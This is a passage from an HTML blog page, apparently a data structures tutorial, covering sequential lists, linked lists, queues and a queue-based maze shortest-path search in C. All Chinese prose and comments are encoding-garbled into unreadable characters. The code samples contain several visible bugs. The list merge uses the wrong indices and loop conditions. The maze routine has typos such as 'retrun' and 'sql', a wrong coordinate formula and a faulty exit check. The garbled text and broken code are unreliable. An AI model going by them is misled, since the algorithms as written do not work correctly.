‚ë°ÂèòÈïøÁöÑÁ∫øÊÄßË°®Â≠òÂÇ®ÁªìÊûÑ‚Äî‚ÄîÈìæÊé•ÂºèÂ≠òÂÇ®ÁªìÊûÑÔºåÂä®ÊÄÅÊï∞ÁªÑÔºåÈ°∫Â∫èÊñá‰ª∂</p><h3 id="Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®‰ª•ÂèäËøêÁÆóÂÆûÁé∞"><a href="#Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®‰ª•ÂèäËøêÁÆóÂÆûÁé∞" class="headerlink" title="Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®‰ª•ÂèäËøêÁÆóÂÆûÁé∞"></a>Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®‰ª•ÂèäËøêÁÆóÂÆûÁé∞</h3><p> &nbsp; &nbsp; &nbsp; ‰ºó‰∫∫ÁöÜÁü•ÁöÑÊï∞ÁªÑÔºåÂÖ∂ÂÆûÂ∞±ÊòØ‰ª•È°∫Â∫èÁªìÊûÑÂ≠òÂÇ®Êï∞ÊçÆÁöÑÁ∫øÊÄßË°®„ÄÇ</p><blockquote><p> È°∫Â∫èË°®Á§∫‰æãÂõæÔºö</p></blockquote><div align="center"><img src="https://i.loli.net/2018/10/09/5bbbfe6d21e6a.png" alt=""><br></div><blockquote><p>È°∫Â∫èË°®ÁªìÊûÑÁÆóÊ≥ïÔºö</p></blockquote><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;windows.h></span></span><span class="token macro property">#<span class="token directive keyword">define</span> MAXSIZE 20           </span><span class="token comment" spellcheck="true">// È°∫Â∫èË°®ÁöÑÊúÄÂ§ßÂ≠òÂÇ®ÂÆπÈáè</span><span class="token keyword">typedef</span> <span class="token keyword">int</span> datatype<span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// È°∫Â∫èË°®Â≠òÂÇ®ÁöÑÊï∞ÊçÆÁ±ªÂûã</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    datatype data<span class="token punctuation">[</span>MAXSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Á∫øÊÄßË°®Â≠òÂÇ®Êï∞ÊçÆ</span>    <span class="token keyword">int</span> Last<span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">//Á∫øÊÄßË°®ÁöÑÈïøÂ∫¶</span><span class="token punctuation">}</span>SeqList<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ÂÆö‰πâ‰∏Ä‰∏™È°∫Â∫èË°® SeqList L;</span><span class="token comment" spellcheck="true">//ÂÆö‰πâ‰∏Ä‰∏™SeqListÁ±ªÂûãÁöÑÊåáÈíà SeqList *L;</span>SeqList <span class="token operator">*</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//ÂàùÂßãÂåñÁ∫øÊÄßË°®</span>    SeqList <span class="token operator">*</span>L<span class="token punctuation">;</span>    L <span class="token operator">=</span> <span class="token punctuation">(</span>SeqList <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SeqList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    L<span class="token operator">-></span>Last<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> L<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    SeqList <span class="token operator">*</span>L <span class="token operator">=</span> <span class="token function">init_SeqList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        L<span class="token operator">-></span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>i<span class="token punctuation">;</span>        L<span class="token operator">-></span>Last <span class="token operator">+</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"ÂΩìÂâçÈ°∫Â∫èË°®ÁöÑÈïøÂ∫¶‰∏∫ %dÔºåÈ°∫Â∫èË°®ÁöÑÂ§ßÂ∞è‰∏∫ %d"</span><span class="token punctuation">,</span>L<span class="token operator">-></span>Last<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>L<span class="token operator">-></span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> </code></pre><p> &nbsp; &nbsp; &nbsp; È°∫Â∫èË°®Â∫îÁî®‰∏æ‰æãÔºöÊúâÈ°∫Â∫èË°®AÔºåBÔºåÂÖ∂ÂÖÉÁ¥†ÂùáÊåâ‰ªéÂ∞èÂà∞Â§ßÁöÑÂçáÂ∫èÊéíÂàóÔºåÁºñÂÜô‰∏Ä‰∏™ÁÆóÊ≥ïÂ∞Ü‰ªñ‰ª¨ÂêàÂπ∂Êàê‰∏Ä‰∏™È°∫Â∫èË°®CÔºåË¶ÅÊ±ÇCÁöÑÂÖÉÁ¥†‰πüÊòØ‰ªéÂ∞èÂà∞Â§ßÁöÑÂçáÂ∫èÊéíÂàó„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ÁÆóÊ≥ïÊÄùË∑ØÔºö‰æùÊ¨°Êâ´ÊèèAÂíåB‰∏≠ÁöÑÂÖÉÁ¥†ÔºåÊØîËæÉÂΩìÂâçÂÖÉÁ¥†ÁöÑÂÄºÔºåÂ∞ÜËæÉÂ∞èÂÄºÁöÑÂÖÉÁ¥†ËµãÁªôCÔºåÁõ¥Âà∞‰∏Ä‰∏™Á∫øÊÄßË°®Êâ´ÊèèÂÆåÊØï‰πãÂêéÂ∞ÜÊú™ÂÆåÁöÑÈÇ£‰∏™È°∫Â∫èË°®‰∏≠‰Ωô‰∏ãÁöÑÈÇ£ÈÉ®ÂàÜËµãÁªôCÔºå‰∏îCÁöÑÂÆπÈáèÈúÄË¶ÅËÉΩÂ§üÂÆπÁ∫≥A,B‰∏§‰∏™Á∫øÊÄßË°®Áõ∏Âä†ÁöÑÈïøÂ∫¶Ôºå<strong>ÁÆóÊ≥ïÂ¶Ç‰∏ã</strong>Ôºö</p><pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge</span><span class="token punctuation">(</span>SeqList A<span class="token punctuation">,</span>SeqList B<span class="token punctuation">,</span>SeqList <span class="token operator">*</span>c<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>k<span class="token punctuation">;</span>    i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token operator">&amp;&amp;</span>j<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">&lt;</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>A<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>A<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">&lt;=</span>B<span class="token punctuation">.</span>last<span class="token punctuation">)</span>        C<span class="token operator">-></span>data<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>B<span class="token punctuation">.</span>data<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    C<span class="token operator">-></span>last<span class="token operator">=</span>k<span class="token number">-1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><blockquote><p>È°∫Â∫èË°®ÁöÑ‰ºòÁº∫ÁÇπÔºö</p><p>Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®ÁªìÊûÑÔºåÂú®Â≠ò„ÄÅËØªÂèñÊï∞ÊçÆÊó∂Ôºå‰∏çÁÆ°ÊòØÂú®Âì™‰∏™‰ΩçÁΩÆÔºåÊó∂Èó¥Â§çÊùÇÂ∫¶ÈÉΩÊòØO(1)„ÄÇËÄåÂú®ÊèíÂÖ•ÊàñËÄÖÂà†Èô§Êó∂ÔºåÊó∂Èó¥Â§çÊùÇÂ∫¶ÈÉΩÊòØO(n)„ÄÇ</p><p>Ëøô‰πüÂ∞±ÊòØÁ∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®ÁªìÊûÑÊØîËæÉÈÄÇÂêàÂ≠òÂèñÊï∞ÊçÆÔºå‰∏çÈÄÇÂêàÁªèÂ∏∏ÊèíÂÖ•ÂíåÂà†Èô§Êï∞ÊçÆÁöÑÂ∫îÁî®„ÄÇ</p><p>‰ºòÁÇπÔºö</p><p>1.Êó†ÈúÄ‰∏∫‰∫ÜË°®Á§∫Ë°®‰∏≠ÂÖÉÁ¥†‰πãÈó¥ÁöÑÈÄªËæëÂÖ≥Á≥ªËÄåÂ¢ûÂä†È¢ùÂ§ñÁöÑÂ≠òÂÇ®Á©∫Èó¥ÔºàÁõ∏ÂØπ‰∫éÈìæÂºèÂ≠òÂÇ®ËÄåË®ÄÔºâ„ÄÇ</p><p>2.ÂèØ‰ª•Âø´ÈÄüÁöÑÂ≠òÂèñË°®‰∏≠‰ªªÊÑè‰ΩçÁΩÆÁöÑÂÖÉÁ¥†„ÄÇ</p><p>Áº∫ÁÇπÔºö</p><p>1.ÊèíÂÖ•ÂíåÂà†Èô§Êìç‰ΩúÈúÄË¶ÅÁßªÂä®Â§ßÈáèÁöÑÂÖÉÁ¥†„ÄÇ</p><p>2.ÂΩìÁ∫øÊÄßË°®ÈïøÂ∫¶ÂèòÂåñËæÉÂ§ßÊó∂ÔºåÈöæ‰ª•Á°ÆÂÆöÂ≠òÂÇ®Á©∫Èó¥ÁöÑÂÆπÈáè„ÄÇ</p><p>3.ÂÆπÊòìÈÄ†ÊàêÂ≠òÂÇ®Á©∫Èó¥ÁöÑ‚ÄúÁ¢éÁâá‚Äù(Âõ†‰∏∫Á∫øÊÄßË°®ÁöÑÈ°∫Â∫èÂ≠òÂÇ®ÁªìÊûÑÁî≥ËØ∑ÁöÑÂÜÖÂ≠òÁ©∫Èó¥ÈÉΩ‰ª•ËøûÁª≠ÁöÑÔºåÂ¶ÇÊûúÂõ†‰∏∫Êüê‰∫õÊìç‰ΩúÔºàÊØîÂ¶ÇÂà†Èô§Êìç‰ΩúÔºâÂØºËá¥Êüê‰∏™ÈÉ®ÂàÜÂá∫Áé∞‰∫Ü‰∏ÄÂ∞èÂùóÁöÑ‰∏çËøûÁª≠ÂÜÖÂ≠òÁ©∫Èó¥ÔºåÂõ†‰∏∫Ëøô‰∏ÄÂ∞èÂùóÂÜÖÂ≠òÁ©∫Èó¥Â§™Â∞è‰∏çËÉΩÂ§üÂÜçÊ¨°Ë¢´Âà©Áî®/ÂàÜÈÖçÔºåÈÇ£‰πàÂ∞±ÈÄ†Êàê‰∫ÜÂÜÖÂ≠òÊµ™Ë¥πÔºå‰πüÂ∞±ÊòØ‚ÄúÁ¢éÁâá‚Äù)</p><p>ÂèÇËÄÉ <a href="https://www.cnblogs.com/wsnb/p/5191518.html" target="_blank" rel="noopener">https://www.cnblogs.com/wsnb/p/5191518.html</a></p></blockquote><h3 id="Á∫øÊÄßË°®ÁöÑÈìæÂºèÂ≠òÂÇ®ÂíåËøêÁÆóÂÆûÁé∞"><a href="#Á∫øÊÄßË°®ÁöÑÈìæÂºèÂ≠òÂÇ®ÂíåËøêÁÆóÂÆûÁé∞" class="headerlink" title="Á∫øÊÄßË°®ÁöÑÈìæÂºèÂ≠òÂÇ®ÂíåËøêÁÆóÂÆûÁé∞"></a>Á∫øÊÄßË°®ÁöÑÈìæÂºèÂ≠òÂÇ®ÂíåËøêÁÆóÂÆûÁé∞</h3><p> &nbsp; &nbsp; &nbsp; È°∫Â∫èË°®ÊúÄÂ§ßÁöÑÁº∫ÁÇπÊòØÁßªÂä®Êï∞ÊçÆÂÖÉÁ¥†ÈúÄË¶ÅËÄóË¥πËÆ∏Â§öÊó∂Èó¥ÔºåÂΩ±ÂìçÊìç‰ΩúÊïàÁéá„ÄÇÊ≠£ÊòØÂõ†‰∏∫È°∫Â∫èË°®ÁöÑÁâπÊÄßÔºåÁõ∏ÈÇª‰∏§ÂÖÉÁ¥†‰πãÈó¥ÁöÑÊï∞ÊçÆÂ≠òÂú®Áõ∏ÈÇªÁöÑÂÖ≥Á≥ªÔºå‰ΩøÂæóÊèíÂÖ•Âà†Èô§ÁöÑÊìç‰ΩúÈ∫ªÁÉ¶‰∫ÜËÆ∏Â§ö„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ËÄåÈìæÂºèÂ≠òÂÇ®ÊñπÊ≥ï‰∏çÈúÄË¶ÅÁî®Âú∞ÂùÄËøûÁª≠ÁöÑÂ≠òÂÇ®ÂçïÂÖÉÊù•ÂÆûÁé∞Ôºå‰ªéËÄåÂèØ‰ª•‰ΩøÂæóÈÄªËæëÁõ∏ÈÇªÁöÑ‰∏§Êï∞ÊçÆÂÖÉÁ¥†Âú®Áâ©ÁêÜ‰∏ä‰∏çÁõ∏ÈÇªÔºå‰ΩÜÊúâ‰ºòÁÇπÂ∞±ÊúâÁº∫ÁÇπÔºåÈìæÂºèÂ≠òÂÇ®ÊñπÊ≥ï‰∏çËÉΩËøõË°åÈöèÊú∫Â≠òÂèñ„ÄÇ</p><p> &nbsp; &nbsp; &nbsp; ËÄåÈìæË°®ÂèàÊúâÂçïÈìæË°®ÔºåÂæ™ÁéØÈìæË°®ÔºåÂèåÂêëÈìæË°®ÔºåÈùôÊÄÅÈìæË°®ÁöÑÂå∫Âà´„ÄÇ</p><h2 id="ÈòüÂàó"><a href="#ÈòüÂàó" class="headerlink" title="ÈòüÂàó"></a>ÈòüÂàó</h2><blockquote><p>ÈòüÂàóÊòØ‰∏ÄÁßçÊìç‰ΩúÂèóÈôêÁöÑÁ∫øÊÄßÊï∞ÊçÆÁªìÊûÑÔºå‰∏éÊ†àÂêéËøõÂÖàÂá∫(LIFO)ÁöÑÊï∞ÊçÆÁªìÊûÑÊà™ÁÑ∂‰∏çÂêåÁöÑÊòØÈòüÂàóÊòØ‰∏ÄÁßç‚ÄúÂÖàËøõÂÖàÂá∫‚ÄùÔºàFIFOÔºâÁöÑÊï∞ÊçÆÁªìÊûÑ„ÄÇÂ∞ÜËøôÁßçÊèíÂÖ•Âú®Ë°®‰∏ÄÁ´ØËøõË°åÔºåËÄåÂà†Èô§Âú®Ë°®Âè¶‰∏ÄÁ´ØËøõË°åÁöÑÊï∞ÊçÆÁªìÊûÑÁß∞‰∏∫ÈòüÂàóÔºàQueue)ÔºåÂπ∂ÂÖÅËÆ∏ÊèíÂÖ•ÁöÑ‰∏ÄÁ´Ø‰∏∫ÈòüÂ∞æÔºàRearÔºâÔºåÂÖÅËÆ∏Âà†Èô§ÁöÑ‰∏ÄÁ´Ø‰∏∫ÈòüÈ¶ñÔºàFrontÔºâ„ÄÇ</p><p><img src="https://i.loli.net/2018/10/16/5bc53818b751c.png" alt=""></p><p>ÈòüÂàóÁöÑÊäΩË±°Êï∞ÊçÆÁ±ªÂûãÂ¶Ç‰∏ãÔºö</p><pre><code>ADT Queue{Êï∞ÊçÆÂØπË±°ÔºöD={ai|ai‚ààElemSet, i=1,2, ‚Ä¶,n, n‚â•0}Êï∞ÊçÆÂÖ≥Á≥ªÔºöR1={&lt;ai-1,ai&gt;|ai-1,ai‚ààD, i=1,2, ‚Ä¶,n }            Á∫¶ÂÆöa1‰∏∫ÈòüÂàóÂ§¥Ôºåan‰∏∫ÈòüÂàóÂ∞æ„ÄÇÂü∫Êú¨Êìç‰ΩúÔºö    InitQueue( &amp;Q ):      Êìç‰ΩúÁªìÊûúÔºöÊûÑÈÄ†‰∏Ä‰∏™Á©∫ÈòüÂàóQ„ÄÇ    DestroyQueue ( &amp;Q ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöÈîÄÊØÅÈòüÂàóQ„ÄÇ    ClearQueue ( &amp;Q ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöÂ∞ÜQÊ∏Ö‰∏∫Á©∫ÈòüÂàó„ÄÇ    QueueEmpty( Q ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöËã•Q‰∏∫Á©∫ÈòüÂàóÔºåÂàôËøîÂõûTRUEÔºåÂê¶ÂàôËøîÂõûFALSE„ÄÇ    QueueLength( Q ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöËøîÂõûQÁöÑÊï∞ÊçÆÂÖÉÁ¥†‰∏™Êï∞ÔºåÂç≥ÈòüÂàóÁöÑÈïøÂ∫¶„ÄÇ    GetHead( Q, &amp;e ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®‰∏îÈùûÁ©∫„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöÁî®eËøîÂõûQÁöÑÈòüÂ§¥ÂÖÉÁ¥†„ÄÇ    EnQueue( &amp;Q, e ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöÊèíÂÖ•ÂÖÉÁ¥†e‰∏∫QÁöÑÊñ∞ÁöÑÈòüÂ∞æÂÖÉÁ¥†„ÄÇ    DeQueue( &amp;Q, &amp;e ):      ÂàùÂßãÊù°‰ª∂ÔºöÈòüÂàóQÂ∑≤Â≠òÂú®‰∏îÈùûÁ©∫„ÄÇ      Êìç‰ΩúÁªìÊûúÔºöÂà†Èô§QÁöÑÈòüÂ§¥ÂÖÉÁ¥†ÔºåÂπ∂Áî®eËøîÂõûÂÖ∂ÂÄº„ÄÇ}ADT Queue</code></pre></blockquote><h3 id="Âü∫‰∫éÈòüÂàóÁöÑÁÆóÊ≥ïËÆæËÆ°ÂÆû‰æã"><a href="#Âü∫‰∫éÈòüÂàóÁöÑÁÆóÊ≥ïËÆæËÆ°ÂÆû‰æã" class="headerlink" title="Âü∫‰∫éÈòüÂàóÁöÑÁÆóÊ≥ïËÆæËÆ°ÂÆû‰æã"></a>Âü∫‰∫éÈòüÂàóÁöÑÁÆóÊ≥ïËÆæËÆ°ÂÆû‰æã</h3><blockquote><p>‚Äã    Ê±ÇËø∑ÂÆ´ÁöÑÊúÄÁü≠Ë∑ØÂæÑÔºöÁé∞Ë¶ÅÊ±ÇËÆæËÆ°‰∏Ä‰∏™ÁÆóÊ≥ïÊâæ‰∏ÄÊù°‰ªéËø∑ÂÆ´ÂÖ•Âè£Âà∞Âá∫Âè£ÁöÑÊúÄÁü≠Ë∑ØÂæÑ„ÄÇ</p><pre class=" language-c"><code class="language-c"><span class="token comment" spellcheck="true">//ÈòüÁöÑÂÆö‰πâ</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ËÆ∞ÂΩïÂùêÊ†á</span>    <span class="token keyword">int</span> pre<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//pre‰Ωú‰∏∫ÂâçÈ©±ÁÇπÂú®sq‰∏≠ÁöÑÂùêÊ†á</span><span class="token punctuation">}</span>sqtype<span class="token punctuation">;</span>sqtype sq<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//ÂÆö‰πâÂ§¥Â∞æ</span><span class="token comment" spellcheck="true">//ÁÆóÊ≥ïÂ¶Ç‰∏ãÔºö</span><span class="token keyword">void</span> <span class="token function">path</span><span class="token punctuation">(</span>maze<span class="token punctuation">,</span>move<span class="token punctuation">)</span>    <span class="token keyword">int</span> maze<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//Ëø∑ÂÆ´Êï∞ÁªÑ</span>    item move<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//ÂùêÊ†áÂ¢ûÈáèÊï∞ÁªÑ</span><span class="token punctuation">{</span>    sqtype sq<span class="token punctuation">[</span>NUM<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> front<span class="token punctuation">,</span>rear<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">,</span>v<span class="token punctuation">;</span>    front <span class="token operator">=</span> rear <span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>    sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> sq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>y <span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>sql<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    maze<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>front<span class="token operator">&lt;=</span>rear<span class="token punctuation">)</span><span class="token punctuation">{</span>        x <span class="token operator">=</span> sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span>y<span class="token operator">=</span>sq<span class="token punctuation">[</span>front<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>v<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>v<span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">;</span>v<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//Êé¢ÊµãÂÖ´‰∏™ÊñπÂêëÁöÑË∑ØÂæÑ</span>            i <span class="token operator">=</span> x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">;</span> j<span class="token operator">=</span>x<span class="token operator">+</span>move<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                rear<span class="token operator">++</span><span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>x <span class="token operator">=</span> i<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token operator">=</span>j<span class="token punctuation">;</span>                sq<span class="token punctuation">[</span>rear<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token operator">=</span>front<span class="token punctuation">;</span>                maze<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//Ëµ∞ËøáÁöÑË∑ØÁΩÆ-1</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>i<span class="token operator">==</span>m<span class="token operator">&amp;&amp;</span>j<span class="token operator">==</span>m<span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token function">printpath</span><span class="token punctuation">(</span>sq<span class="token punctuation">,</span>rear<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//ÊâìÂç∞Ëø∑ÂÆ´</span>                  <span class="token function">restore</span><span class="token punctuation">(</span>maze<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">//ÊÅ¢Â§çËø∑ÂÆ´ÔºåÊ≠§Â§ÑÊú™ÂÜôËØ•ÂáΩÊï∞</span>                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        front<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    retrun <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//ÊâìÂç∞Ëø∑ÂÆ´ÁöÑÂáΩÊï∞</span><span class="token keyword">void</span> <span class="token function">printpath</span><span class="token punctuation">(</span>sqtype sq<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token keyword">int</span> rear<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    i <span class="token operator">=</span> rear<span class="token punctuation">;</span>    <span class="token keyword">do</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"(%d,%d)&lt;--"</span><span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>x<span class="token punctuation">,</span>sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>        i <span class="token operator">=</span> sq<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>pre<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span>i<span class="token operator">!=</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><img src="https://i.loli.net/2018/10/16/5bc543e6329ce.png" alt=""></p><p>‚Äã    Âæ™ÁéØÈòüÂàóÊòØÈòüÂàóÁöÑ‰∏ÄÁßçÔºåÂ∞±ÂÉè‰∏Ä‰∏™È¶ñÂ∞æÁõ∏ËøûÁöÑË¥™ÂêÉËõáÔºå‰∏ÄÁõ¥ËΩ¨ÂúàÔºåË∂ÖËøá‰∏ÄÂÆöÈïøÂ∫¶ÔºåÂ∞±‰ºöÂêÉÂà∞Ëá™Â∑±ÁöÑÂ∞æÂ∑¥„ÄÇ    </p><p>‚Äã    